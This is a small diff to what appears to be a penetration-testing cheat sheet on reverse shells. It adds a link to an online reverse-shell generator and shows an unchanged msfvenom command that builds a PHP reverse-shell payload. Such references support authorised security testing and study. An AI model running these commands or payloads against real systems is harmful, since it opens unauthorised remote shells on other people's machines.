@@ -42,7 +42,7 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 
 #### Online Generator
 <https://www.revshells.com/>
-
+<https://weibell.github.io/reverse-shell-generator/>
 
 ## Single line Webshell
 
